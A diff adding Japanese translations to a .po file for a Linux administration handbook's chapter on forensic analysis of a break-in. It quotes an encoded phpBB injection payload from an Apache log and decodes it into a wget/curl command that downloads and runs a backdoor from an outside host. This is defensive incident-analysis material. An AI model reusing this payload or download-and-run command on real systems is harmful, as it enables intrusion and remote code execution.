+msgstr "これらの操作は専用ソフトウェアを使うことで簡単に実行することが可能です。特に、<emphasis>The Coroner Toolkit</emphasis> (<emphasis role=\"pkg\">tct</emphasis> パッケージに含まれます) は専用ソフトウェアツール集です。<emphasis>The Coroner Toolkit</emphasis> には幾つかのツールが含まれます; 中でも、起動中の不正侵入されたシステムからデータを収集することが可能な <command>grave-robber</command>、ディスクの未使用領域から興味深いデータを抽出する <command>lazarus</command>、プロセスが使っているメモリの複製を取ることが可能な <command>pcat</command> は注目に値します。他のデータ抽出ツールも含まれています。<indexterm><primary>The Coroner Toolkit</primary></indexterm>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">sleuthkit</emphasis> package provides a few other tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role=\"pkg\">autopsy</emphasis> package). <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>"
-msgstr ""
+msgstr "<emphasis role=\"pkg\">sleuthkit</emphasis> パッケージはファイルシステムを解析する別のツールを提供します。これは <emphasis>Autopsy Forensic Browser</emphasis> グラフィカルインターフェイス (<emphasis role=\"pkg\">autopsy</emphasis> パッケージに含まれます) から簡単に使うことが可能です。<indexterm><primary>Autopsy Forensic Browser</primary></indexterm>"
 
 #. Tag: title
 #, no-c-format
 msgid "Reconstituting the Attack Scenario"
-msgstr ""
+msgstr "攻撃シナリオの再構成"
 
 #. Tag: para
 #, no-c-format
 msgid "All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings."
-msgstr ""
+msgstr "解析中に収集された全ての要素はジグソーパズルのピースの如く組み合わさるべきです; 最初の疑わしいファイルの作成は破壊を証明するログと関係があります。実世界の例は長ったらしい理論よりもより明白であるべきです。"
 
 #. Tag: para
 #, no-c-format
 msgid "The following log is an extract from an Apache <filename>access.log</filename>:"
-msgstr ""
+msgstr "以下のログは Apache <filename>access.log</filename> から抽出したものです:"
 
 #. Tag: programlisting
 #, no-c-format
@@ -2243,21 +2398,24 @@ msgid ""
 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
 "      "
 msgstr ""
+"\n"
+"www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "This example matches exploitation of an old security vulnerability in phpBB. <ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
-msgstr ""
+msgstr "これは phpBB の古いセキュリティ脆弱性を突いた例です。<ulink type=\"block\" url=\"http://secunia.com/advisories/13239/\" /> <ulink type=\"block\" url=\"http://www.phpbb.com/phpBB/viewtopic.php?t=240636\" />"
 
 #. Tag: para
 #, no-c-format
 msgid "Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: <command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command>. Indeed, a <filename>bd</filename> file was found in <filename>/tmp/</filename>. Running <command>strings /mnt/tmp/bd</command> returns, among other strings, <literal>PsychoPhobia Backdoor is starting...</literal>. This really looks like a backdoor."
-msgstr ""
+msgstr "長い URL を復号することで、攻撃者が幾つかの PHP コードを実行しようと試みたことが理解できます。はっきり言うと: <command>system(\"cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;\")</command> です。確かに、<filename>bd</filename> ファイルが <filename>/tmp/</filename> の中で見つかりました。<command>strings /mnt/tmp/bd</command> を実行したところ、他の文字列に混じって、<literal>PsychoPhobia Backdoor is starting...</literal> が返されました。これはまさにバックドアのように見えます。"
 
 #. Tag: para
 #, no-c-format
 msgid "Some time later, this access was used to download, install and run an IRC <emphasis>bot</emphasis> that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file:"
-msgstr ""
+msgstr "暫くの後、このアクセスは地下 IRC ネットワークに接続する IRC <emphasis>ボット</emphasis>をダウンロード、インストール、実行するために使われました。このボットは IRC プロトコルを介して制御され、共有するファイルをダウンロードする指示を与えられました。このプログラムは自分自身のログファイルを持っています:"
 
 #. Tag: programlisting
 #, no-c-format
@@ -2276,18 +2434,31 @@ msgid ""
 "(...)\n"
 "** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
 msgstr ""
+"** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)\n"
+"** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT\n"
+"** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024\n"
+"** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating\n"
+"** 2004-11-29-19:50:20: DCC CHAT Correct password\n"
+"(...)\n"
+"** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)\n"
+"(...)\n"
+"** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)\n"
+"(...)\n"
+"** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)\n"
+"(...)\n"
+"** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)\n"
 
 #. Tag: para
 #, no-c-format
 msgid "These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address."
-msgstr ""
+msgstr "ログに残された痕跡によれば、82.50.72.202 IP アドレスを経由して 2 つのビデオファイルがサーバ上に保存されたことが判ります。"
 
 #. Tag: para
 #, no-c-format
 msgid "In parallel, the attacker also downloaded a pair of extra files, <filename>/tmp/pt</filename> and <filename>/tmp/loginx</filename>. Running these files through <command>strings</command> leads to strings such as <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and <foreignphrase>Now wait for suid shell...</foreignphrase>. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach."
-msgstr ""
+msgstr "並行して、攻撃者はさらにファイルをダウンロードしました。<filename>/tmp/pt</filename> と <filename>/tmp/loginx</filename> です。<command>strings</command> を介してこれらのファイルを調べると、<foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> や <foreignphrase>Now wait for suid shell...</foreignphrase> などの文字列が見つかりました。プログラムは管理者権限を取得するためにローカルの脆弱性を不正利用しているように見えます。攻撃者は目標を達成したでしょうか? この場合、おそらくまだでしょう。なぜなら、最初の破壊行為の後どのファイルも修正されていなかったからです。"
 
 #. Tag: para
 #, no-c-format
 msgid "In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability."
-msgstr ""
+msgstr "この例では、不正侵入の全てが再構成されました。そして、攻撃者は不正侵入されたシステムを 3 日間に渡って悪用することができたと推測することが可能です; しかし、解析で明らかになった最も重要な要素は脆弱性の内容です。管理者は新規インストールによって完全にこの種の脆弱性が修正されたことを保証することが可能です。"
